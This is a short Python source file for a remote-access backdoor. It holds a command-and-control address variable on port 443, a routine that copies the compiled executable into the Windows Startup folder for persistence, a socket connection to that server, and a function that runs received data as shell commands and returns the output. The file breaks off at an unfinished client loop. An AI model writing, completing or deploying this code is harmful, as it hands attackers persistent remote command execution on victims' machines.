import socket
import subprocess
import threading
import time
import os


CCIP = ""
CCPORT = 443

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    #print(exe_file)
    os.system("copy {} \%APPDATA%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\"".format(exe_file))

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)


def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)


def cli(client):
    

